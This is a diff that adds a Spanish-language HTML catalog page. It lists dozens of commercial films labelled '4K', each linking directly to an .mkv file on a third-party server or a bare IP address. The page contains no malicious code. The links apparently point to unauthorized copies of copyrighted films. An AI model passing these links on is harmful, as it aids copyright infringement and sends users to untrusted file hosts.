@@ -1,0 +1,645 @@
+﻿<!DOCTYPE html>
+<html dir='ltr' lang='es' prefix='og: http://ogp.me/ns#' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<!-- Basic data -->
+<meta charset='UTF-8'/>
+<meta content='article' property='og:type'/>
+<!-- Responsive viewport -->
+<meta content='width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0' name='viewport'/>
+<!-- Title -->
+<title>    </title>
+<style type='text/css'>
+*{margin:0;padding:0;box-sizing:border-box;list-style:grid;}
+a{text-decoration:none;}
+body{background:#000;font-family:Nunito,sans-serif;}
+
+.cards{display:grid;grid-template-columns:repeat(5,1fr);grid;align-items: stretch;
+    justify-items: stretch;}
+
+.card{text-align:center;}
+.card img{
+    padding: 0px;
+    padding-top: 0px;
+    width: 94%;
+    height: 84%;
+    border-radius:7px;}
+
+.card span{padding:0 .3rem;display:none;}
+a{-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-tap-highlight-color:transparent;} 
+.form__group{position:relative;padding:15px 0 0;margin:0 auto;margin-top:10px;margin-bottom:1rem;width:90%;}
+.form__field{font-family:inherit;width:100%;border:0;border-bottom:2px solid #9b9b9b;outline:0;font-size:1.3rem;color:#fff;padding:7px 0;background:0 0;transition:border-color .2s;}
+.form__field::placeholder{color:transparent;}
+.form__field:placeholder-shown~.form__label{font-size:1.3rem;cursor:text;top:20px;}
+.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:#fff;}
+.form__field:focus{padding-bottom:6px;font-weight:700;border-width:3px;border-image:linear-gradient(to right,red,#008cf7,red);border-image-slice:1;}
+.form__field:focus~.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:red;font-weight:700;}
+.form__field:invalid,.form__field:required{box-shadow:none;}
+
+
+
+/*Fix: Unnecessary elements removed*/
+.widget-item-control,.item-control.blog-admin,
+.continue,.loadmore,.thread-chrome.thread-collapsed,
+.singleton-element:not(.cookie-choices-info),
+.noAllowNewComments .comment-reply,
+.comments .hidden {display:none;}
+/*Fix: Show lightbox*/
+.CSS_LIGHTBOX{z-index:90001!important;}
+/*Fix: Image responsive*/
+a[imageanchor]:not([style*=float]){margin-right:0!important;margin-left:0!important;}
+.widget-content img,
+img[data-original-height],
+img[data-original-width] {height: auto;}
+/*Fix: Comment Editor*/
+#comment-editor{border:0;width:100%;min-height:220px;}
+.box{margin:0 auto;margin-bottom:2rem;width:60%;display:flex;align-items:center;}
+#caps{font-size:1.3rem;}
+.progress{background:#212042;width:100%;height:15px;border-radius:10px;}
+.progress-bar{width:0;opacity:0;height:15px;background:linear-gradient(to right,#228ee9,#1b7dbf);border-radius:10px;display:flex;justify-content:center;align-items:center;transition:1s ease;}
+.box span{padding-left:10px;color:#fff;}
+
+
+
+.xaviec {
+    background: #000;
+    position: fixed;
+    top: -16px;
+    right: -0.5em;
+    width: 20%;
+}
+
+
+
+.card h6{
+background:#212042;
+position:auto;
+margin-bottom:20%;
+color:#fff;
+font-size:0.15.5rem;
+border-radius:7px;
+}
+
+
+/* prueba de paginacion */
+.paginacion {
+	padding-top:10%;
+}
+
+.paginacion ul {
+	list-style:none;
+	text-align: center;
+}
+
+.paginacion ul li {
+	display:inline-block;
+	margin-right:5px;
+}
+
+.paginacion ul li a {
+	display:block;
+	padding:5px 10px;
+	color:#fff;
+	background:#024959;
+	text-decoration: none;
+}
+
+.paginacion ul li a:hover {
+	background:#ff0000;
+}
+
+.paginacion ul li .active {
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
+    transition-delay: 0.1s;
+}
+
+
+/* luz de neon alrededor */
+
+
+img:hover{
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000; /*efecto con el mouse*/
+}
+
+
+
+
+
+
+        /*          Pagination
+        ***************************/
+        /*Pagination Links Background*/
+
+
+
+.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.nav-links a,.nav-links span,.tagcloud a{background-color: #313036 }
+        @media screen and (max-width:62em){
+            .Menu>ul>li{border-bottom-color: #313036 }
+            .Menu .sub-menu a{background-color: #313036 }
+        }
+        /*Pagination Links Background Hover*/.menu-azlist ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{background-color: #de1212 }
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a:hover{background-color: #de1212 }
+        }
+        /*Pagination Links Color*/.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.tagcloud a{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a{color: #fff !important}
+        }
+        /*Pagination Links Color Hover*/.Menu li.menu-azlist:hover ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu li:hover .sub-menu li:hover a,.Menu .sub-menu li:hover:before{color: #fff !important}
+        }
+
+
+
+
+
+
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+}
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+    --dark-2: rgba(0,0,0,.2);
+    --dark-5: rgba(0,0,0,.5);
+    --light-1: rgba(255,255,255,.1);
+    --light-2: rgba(255,255,255,.2);
+    --light-7: rgba(255,255,255,.7);
+    --success: #28a745;
+    --danger: #FF5757;
+    --warning: #ffc107;
+    --size: 1rem;
+    --f-size: 1rem;
+    --family: 'Work Sans';
+}
+
+
+
+
+
+.pagination {
+    text-align: center;
+    font-weight: 700;
+    margin-bottom: var(--size);
+}
+
+a:-webkit-any-link {
+    color: -webkit-link;
+    cursor: pointer;
+    text-decoration: underline;
+}
+
+.btn.snd, .page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+.btn, button, [type=button], [type=reset], [type=submit], .pagination a, .extend, .tagcloud a, a.comment-reply-link {
+    cursor: pointer;
+    padding: .5rem 0.1rem;
+    display: inline-block;
+    vertical-align: top;
+    text-align: center;
+    line-height: 2rem;
+    width: auto;
+    background-color: var(--light-2);
+    color: var(--light);
+    min-width: 3rem;
+    border: 0;
+}
+
+
+.page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+
+
+
+
+
+
+
+.boton {
+    width: 8em;
+    height: 2em;
+border: 1px solid #2e5c8b;; /*anchura, estilo y color borde*/
+padding: 8px; /*espacio alrededor texto*/
+background-color: #20f504; /*color botón*/
+color: #ffffff; /*color texto*/
+text-decoration: none; /*decoración texto*/
+text-transform: uppercase; /*capitalización texto*/
+font-family: 'Helvetica', sans-serif; /*tipografía texto*/
+border-radius: 50px; /*bordes redondos*/
+    position: absolute;
+    top: 2em;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</style>
+<link href='https://fonts.googleapis.com/css2?family=Nunito&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Lato&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Montserrat&display=swap' rel='stylesheet'/>
+
+  <BR>
+  <BR>
+  <BR>
+
+
+
+<nav class="navigation pagination">
+<div class="nav-links">
+
+				<a class="page-link" href="1.html">1</a>
+				<a class="page-link" href="2.html">2</a>
+				<a class="page-link" href="3.html">3</a>
+				<a class="page-link" href="4.html">4</a>
+				<a class="page-link" href="5.html">5</a>
+				<a class="page-link" href="6.html">6</a>
+				<a class="page-link" href="7.html">7</a>
+				<a class="page-link" href="8.html">8</a>
+				<a class="page-link" href="9.html">9</a>
+				<a class="page-link" href="10.html">10</a>
+		<!--   		<a class="page-link" href="11.html">11</a>
+				<a class="page-link" href="12.html">12</a>
+				<a class="page-link" href="13.html">13</a>
+				<a class="page-link" href="14.html">14</a>
+				<a class="page-link" href="15.html">15</a>
+				<a class="page-link" href="16.html">16</a>
+				<a class="page-link" href="17.html">17</a>
+				<a class="page-link" href="18.html">18</a>
+				<a class="page-link" href="19.html">19</a>
+				<a class="page-link" href="20.html">20</a>
+				<a class="page-link" href="21.html">21</a>
+				<a class="page-link" href="22.html">22</a>
+				<a class="page-link" href="23.html">23</a>
+				<a class="page-link" href="24.html">24</a>
+				<a class="page-link" href="25.html">25</a>
+				<a class="page-link" href="26.html">26</a>
+				<a class="page-link" href="27.html">27</a>
+				<a class="page-link" href="28.html">28</a>          -->
+				<a class="page-link current" href="4K.html">4K</a>
+				<a class="page-link" href="2023.html">2023</a>
+				<a class="page-link" href="N1Ñ05.html">INFANTILES</a>
+
+</div>
+</nav>
+
+
+</head>
+<body>
+
+
+
+
+
+
+
+<!--LAS DEMÁS-->
+<div class="xaviec">
+<div class="form__group field">
+<input autocomplete="off" type="input" onkeyup="myFunction()" class="form__field" placeholder="Buscar" name="name" id="myInput" required />
+<label for="name" class="form__label">Buscar</label>
+</div></div></div><br><br><br><br>
+<center><ul class="cards" id="cards">
+
+        
+      <!--      <a class="boton" href="C:\Users\Terminal 2\Desktop\Nueva carpeta (2)\PELIS2022\PELIS2022-PAG2.html" target="_blank">PAG SIG ==>></a>     -->
+
+
+
+
+
+
+
+
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/spectre.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2015/10/w1280/aD8fQF2WFAvMMxmMHHj2RXz2hwP.jpg	"/> <h6>	007 Spectre (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/alien%20covenant.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2017/5/w1280/245tgZ3mTHWs0NRiPSwPjKobKHf.jpg	"/> <h6>	Alien Covenant (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/assassins%20creed.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/12/w1280/njB8UnVBp6GznmIzlTNm51LwiHR.jpg	"/> <h6>	Assassins Creed (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/avatar.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2009/12/w1280/tXmTHdrZgNsULqCbThK2Dt2X9Wt.jpg	"/> <h6>	Avatar (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/battleship.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2012/4/w1280/ddQI1uU1A7dm50J49tCTPGF179z.jpg	"/> <h6>	Batalla naval (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/NOVIEMBRE/24NOV/Black.Adam.2160p.4K-dual-lat.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/mPTzXksC8HcAj6EM6WjZFJVJEzF.jpg	"/> <h6>	Black Adam (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/captain%20america%20civil%20war.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/4/w1280/jPPy7tCfglppQo6J9nGwU6UmJ8X.jpg	"/> <h6>	Capitan America: Guerra civil (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/carrie.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2013/10/w1280/mJX62lKNQAzowhAsHLGqp9yzuNN.jpg	"/> <h6>	Carrie (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/4KPELICULA/4k%2817DIC%29/Private.Lesson.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/12/w1280/aKL4CA8BsdDlKFiF0gaLQAYG4rp.jpg	"/> <h6>	Clases particulares (4K) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/predator.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/1987/6/w1280/elmVECDoeLik3eRwfVsyfDfd6iB.jpg	"/> <h6>	Depredador (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/doctor%20strange.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/10/w1280/wJEZI3PWyMW7qcW6n9jyCh7Cclf.jpg	"/> <h6>	Doctor Extraño (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/the%20da%20vinci%20code.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2006/5/w1280/vOGikJku5HDxcdHvnH4SqqWibO0.jpg	"/> <h6>	El codigo Da Vinci (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/the%20revenant.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2015/12/w1280/k3Jh7J5GGMx1lmr7qmynRxOvOK5.jpg	"/> <h6>	El renacido (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/elysium.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2013/8/w1280/zEdwDsEwny5rAZ8WEPA97XBqtru.jpg	"/> <h6>	Elysium (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/4KPELICULA/4k%2817DIC%29/Emancipacion%20-%202022%20%281%29.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/12/w1280/zQe7paVC4tSwb8vBwxSqajJ22Ue.jpg	"/> <h6>	Emancipación (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/suicide%20squad.mkv	 " target="_blank"  class="card"> <img src="	https://m.media-amazon.com/images/I/81NyY90J0fL._SY606_.jpg	"/> <h6>	Escuadron suicida (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/spectral.mkv	 " target="_blank"  class="card"> <img src="	https://m.media-amazon.com/images/M/MV5BYWQxN2I1NjItMDVjMS00ZmJjLWIyYjItOWI2OGY5NTU1ZjI2L2ltYWdlL2ltYWdlXkEyXkFqcGdeQXVyNTc3MjM3OTA@._V1_.jpg	"/> <h6>	Espectral (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/split.mkv	 " target="_blank"  class="card"> <img src="	https://mx.web.img2.acsta.net/pictures/17/10/17/08/11/3054670.jpg	"/> <h6>	Fragmentado (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/guardians%20of%20the%20galaxy.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2014/7/w1280/rzEmtM8qrvRKNdJUUiizdNHTccV.jpg	"/> <h6>	Guardianes de la galaxia (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/guardians%20of%20the%20galaxy%20vol%202.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2017/4/w1280/kdg6Y06jfq9FV7qknWNcKLYtBJn.jpg	"/> <h6>	Guardianes de la galaxia vol.2 (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/hacksaw%20ridge.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/10/w1280/m3jj8IJ7uP5p4MqMzgtGW5l4ECd.jpg	"/> <h6>	Hasta el ultimo hombre (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/inferno.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/10/w1280/lCGqpwsgjegq26fMiR54ugJtIc6.jpg	"/> <h6>	Inferno (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/boyka%20undisputed%20iv.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/8/w1280/hn2C89W1APrPPoZ1XQv69jJb1RP.jpg	"/> <h6>	Invicto 4 (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/jurassic%20world.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2015/6/w1280/lWhnr4ehIiRMudbF6YCEViatbaN.jpg	"/> <h6>	Jurassic World (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/shutter%20island.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2010/2/w1280/56utveUWJwmG12YU7c2zKw6pbRZ.jpg	"/> <h6>	La isla siniestra (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/the%20legend%20of%20tarzan.mkv	 " target="_blank"  class="card"> <img src="	https://i.pinimg.com/originals/b1/36/42/b136428b498960ed7377ddee5dcbb6a7.jpg	"/> <h6>	La leyenda de Tarzan (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/NOVIEMBRE/24NOV/The.Woman.King.2160p.4K-dual-lat.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/jny1jvCkgpzc3C0axQsX9ADYcAl.jpg	"/> <h6>	La mujer Rey (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/life%20of%20pi.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2012/11/w1280/7Y4X4o2SbW9zBLW56crQDR3WCdI.jpg	"/> <h6>	La vida de Pi (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/mad%20max%20fury%20road.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2015/5/w1280/mnVZLdo9C4X80sJmgcGNpMNCbgk.jpg	"/> <h6>	Mad Max: Furia en la carretera (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/4KPELICULA/4k(17DIC)/Margaux%20-%202022%20(1).mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/uNzgeMetu9l4q9NDw7gtiUFwPOJ.jpg	"/> <h6>	Margaux (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/matrix.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/1999/3/w1280/qK76PKQLd6zlMn0u83Ej9YQOqPL.jpg	"/> <h6>	Matrix (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/the%20matrix%20reloaded.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2003/5/w1280/ayZkaN2f3ASjWW8ooCfuJT3T8Va.jpg	"/> <h6>	Matrix recargado (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/the%20matrix%20revolutions.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2003/11/w1280/bkkS61w94ZVMNVd8KEyyJl2tnY5.jpg	"/> <h6>	Matrix revoluciones (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/moana.mkv	 " target="_blank"  class="card"> <img src="	https://mx.web.img3.acsta.net/pictures/20/04/22/09/02/1137018.jpg	"/> <h6>	Moana (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/full%20metal%20jacket.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/1987/6/w1280/hJfHQlX5i9L5ywAHGbZw4OmI3mj.jpg	"/> <h6>	Nacido para matar: La chaqueta metalica (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/4KPELICULA/4k%2817DIC%29/Nanny%20-%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/11/w1280/8qioumLk62Ot1mh9Vom1TXYky6W.jpg	"/> <h6>	Nanny: La niñera (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/cast%20away.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2000/12/w1280/4j5ijr5M19bhdjIWwA9VAxjr50u.jpg	"/> <h6>	Naufrago (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/need%20for%20speed.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2014/3/w1280/z42kyMizgDKetejusZgucSQsQ4l.jpg	"/> <h6>	Need for speed (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/oblivion.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2013/4/w1280/bDiMlnzGaY3dxAcjJTB8yLWAUeB.jpg	"/> <h6>	Oblivion (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/passengers.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/12/w1280/iLMtX4MGl8WjKCPfMgCdDuceOth.jpg	"/> <h6>	Pasajeros (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/4KPELICULA/4k(17DIC)/Pinocho%20-%202022%20(1).mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/1yIM2QL0qLzWMjTGuMX12yZnBtb.jpg	"/> <h6>	Pinocho (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/poltergeist.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/1982/6/w1280/b6JcwPnultjlXSVDGJhtPSAZSEY.jpg	"/> <h6>	Poltergeist (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/power%20rangers.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2017/3/w1280/dgsnZW7zyChQfAzCtmLlPp5twpl.jpg	"/> <h6>	Power Rangers (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/the%20fast%20and%20the%20furious.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2001/6/w1280/rCdEN70nBLJfrzE7NwPtCSxjjrA.jpg	"/> <h6>	Rapidos y furiosos 1 (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/2%20fast%202%20furious.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2003/6/w1280/iZUSbYbUXol5AezpNIJwwENdyE0.jpg	"/> <h6>	Rapidos y furiosos 2 (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/fast%20and%20furious%207.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2015/4/w1280/yWG5W4tKCQweHEdnKV4YEvqOBGx.jpg	"/> <h6>	Rapidos y furiosos 7 (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/the%20fate%20of%20the%20furious.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2017/4/w1280/5b1zDwWxoDG8p8aHoRYfzOd7Lvy.jpg	"/> <h6>	Rapidos y furiosos 8 (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/resident%20evil.mkv	 " target="_blank"  class="card"> <img src="	https://m.media-amazon.com/images/M/MV5BZmI1ZGRhNDYtOGVjZC00MmUyLThlNTktMTQyZGE3MzE1ZTdlXkEyXkFqcGdeQXVyNDE5MTU2MDE@._V1_FMjpg_UX1000_.jpg	"/> <h6>	Resident evil 1: El huesped maldito (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/resident%20evil%20apocalypse.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2004/9/w1280/goVSqAsY54LJZ29gNRM8Kq8lDlp.jpg	"/> <h6>	Resident evil 2: Apocalipsis (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/resident%20evil%20extinction.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2007/9/w1280/7pYyfJwwiR5vl1ZCrni2fVsfqyj.jpg	"/> <h6>	Resident evil 3: Extincion (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/resident%20evil%20afterlife.mkv	 " target="_blank"  class="card"> <img src="	https://es.web.img2.acsta.net/medias/nmedia/18/93/09/10/20235332.jpg	"/> <h6>	Resident evil 4: Resurreccion (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/resident%20evil%20retribution.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2012/9/w1280/s1jwnt0mfZNrYcTlws5nzCaFp5Q.jpg	"/> <h6>	Resident evil 5: Venganza (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/resident%20evil%20the%20final%20chapter.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2016/12/w1280/il1B9mM7Cn9ccavnilzUGKL1xzQ.jpg	"/> <h6>	Resident evil 6: Capitulo final (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/i%20am%20legend.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2007/12/w1280/pO1SrJgf5BumqcIRkYviSGIFdmX.jpg	"/> <h6>	Soy leyenda (4K)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/4KPELICULA/4k(17DIC)/Speak.2004.1080p.BluRay.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2004/1/w1280/kxQ9lRgC3tMVNPzLMFsiOK8H8fn.jpg	"/> <h6>	Speak: Habla (4K) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/thor.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2011/9/w1280/7tgdZEWljiTokgayEmL4SFQuAGu.jpg	"/> <h6>	Thor (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/thor%20the%20dark%20world.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2013/10/w1280/gPAmH41VpK5UPaNhAiNJePzrL8z.jpg	"/> <h6>	Thor: El mundo oscuro (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/titanic.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/1997/11/w1280/rVBIfNJZcTITcVbvgmtyPOF8CzD.jpg	"/> <h6>	Titanic (4K)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas4k/transformers.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2007/6/w1280/phAFhKOEhOGLIuH0brr5EenAckY.jpg	"/> <h6>	Transformers 1 (4K)	</h6></a></li>
